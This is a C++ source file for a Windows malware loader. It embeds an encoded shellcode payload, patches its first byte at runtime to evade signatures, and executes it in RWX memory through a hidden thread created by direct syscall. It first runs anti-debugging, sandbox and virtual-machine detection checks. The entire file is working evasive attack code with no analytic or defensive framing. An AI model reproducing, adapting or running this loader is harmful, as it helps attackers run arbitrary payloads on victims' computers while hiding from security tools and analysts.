#include "CheckHardware.h"
#include "CheckDeviceNames.h"
#include "CheckRunningProcesses.h"
#include "AntiDebugging.h"
#include <Windows.h>
#include "SysCalls.h"

// Stops thread from sending events
#define THREAD_FLAG_HIDE 0x4

void Run()
{
	unsigned char code[] =
		"\x00\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x5e\x70\xcb\x86\x19\xdf\xcd\x5b\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xa2\x38\x48"
		"\x62\xe9\x37\x01\x5b\x5e\x70\x8a\xd7\x58\x8f\x9f\x0a\x08"
		"\x38\xfa\x54\x7c\x97\x46\x09\x3e\x38\x40\xd4\x01\x97\x46"
		"\x09\x7e\x3d\xfa\x4f\x51\xd0\x7a\x11\x14\x38\x40\xf4\x49"
		"\x97\xfc\x9b\xf2\x4c\xaa\xfa\x1b\xf3\xed\x1a\x9f\xb9\xc6"
		"\xc7\x18\x1e\x2f\xb6\x0c\x31\x9a\xce\x92\x8d\xed\xd0\x1c"
		"\x4c\x83\x87\xc9\xb9\x4c\x23\x46\x7b\xc9\x89\x9c\xad\xcd"
		"\x5b\x5e\xfb\x4b\x0e\x19\xdf\xcd\x13\xdb\xb0\xbf\xe1\x51"
		"\xde\x1d\xd0\x16\x68\x8f\x0d\x59\xff\x9d\x12\x5f\xa0\x28"
		"\xd0\x51\x20\x04\x16\x6f\xb9\x8a\x0d\x2d\x57\x85\x5a\x88"
		"\x38\xfa\x46\xb5\x9e\x0c\x92\x53\x31\xca\x47\x21\x3f\xb8"
		"\xaa\x12\x73\x87\xa2\x11\x9a\xf4\x8a\x2b\xa8\x93\xc2\x92"
		"\x9f\xe9\x12\x5f\xa0\xad\xc7\x92\xd3\x85\x1f\xd5\x30\xd7"
		"\xcf\x18\x0f\x8c\xd0\x5a\xf8\x83\x87\xc9\x9e\x95\x1a\x06"
		"\x2e\x92\xdc\x58\x87\x8c\x02\x1f\x2a\x83\x05\xf5\xff\x8c"
		"\x09\xa1\x90\x93\xc7\x40\x85\x85\xd0\x4c\x99\x80\x79\xe6"
		"\x20\x90\x12\xe0\x07\xb8\xb4\x46\xec\xff\x5b\x5e\x31\x9d"
		"\xcf\x90\x39\x85\xda\xb2\xd0\xca\x86\x19\x96\x44\xbe\x17"
		"\xcc\xc9\x86\x08\x83\x0d\xf3\x56\x02\x8a\xd2\x50\x56\x29"
		"\x17\xd7\x81\x8a\x3c\x55\xa8\xeb\x5c\xa1\xa5\x87\x0f\xf3"
		"\xb7\xcc\x5a\x5e\x70\x92\xc7\xa3\xf6\x4d\x30\x5e\x8f\x1e"
		"\xec\x13\x9e\x93\x0b\x0e\x3d\xfa\x4f\x54\xee\x0d\x13\xa1"
		"\xb0\x83\x0f\xdb\x97\x32\x9b\x16\xf9\x0a\xc7\xa3\x35\xc2"
		"\x84\xbe\x8f\x1e\xce\x90\x18\xa7\x4b\x1f\x28\x87\x0f\xfb"
		"\x97\x44\xa2\x1f\xca\x52\x23\x6d\xbe\x32\x8e\xdb\xb0\xbf"
		"\x8c\x50\x20\x03\x2e\xbb\x98\x58\x86\x19\xdf\x85\xd8\xb2"
		"\x60\x83\x0f\xfb\x92\xfc\x92\x34\x74\x8a\xde\x51\x56\x34"
		"\x1a\xe4\x72\x12\x4e\x46\x20\x18\xd8\xa6\x70\xb5\xd3\x51"
		"\x5c\x09\x7b\x00\xf9\x3d\xec\x59\x9e\x94\x33\x5e\x60\xcb"
		"\x86\x58\x87\x85\xd2\xac\x38\xfa\x4f\x58\x65\x95\xff\x0d"
		"\x95\x34\x53\x51\x56\x0e\x12\xd7\xb7\x86\xb7\xd0\x96\x44"
		"\xab\x16\xf9\x11\xce\x90\x26\x8c\xe1\x5c\xa9\x03\xd9\xe6"
		"\x0a\x4e\xa3\x5e\x0d\xe3\xde\x58\x88\x94\x33\x5e\x30\xcb"
		"\x86\x58\x87\xa7\x5b\x04\x31\x71\x8d\x36\xd0\xfd\xa4\x8b"
		"\x27\x92\xc7\xa3\xaa\xa3\x16\x3f\x8f\x1e\xcf\xe6\x11\x24"
		"\x67\xa1\x8f\x34\xce\x18\x1c\x85\x72\x98\x38\x4e\x70\x6c"
		"\x6b\x8c\xa4\xb9\x28\xa1\x86\x40\x96\x0a\x99\xae\xc5\x69"
		"\xd0\xe6\x0a\xcd\x5b";

	// Correct value
	char first[] = "\x48";

	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	// Replace bad byte
	RtlCopyMemory(code, first, sizeof first);
	RtlCopyMemory(pCode, code, sizeof code);

	HANDLE hThread;
	HANDLE hProcess = GetCurrentProcess();

	//PVOID pCode = nullptr;
	SIZE_T size = sizeof code;

	//NtAllocateVirtualMemory(hProcess, &pCode, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//NtWriteVirtualMemory(hProcess, pCode, &code, size, nullptr);

	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, NULL, THREAD_FLAG_HIDE, NULL, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
	AnalysisToolsRunning();
	SystemHasSufficientHardware();
	SystemHasVmDeviceNames();

	Run();
	return 0;
}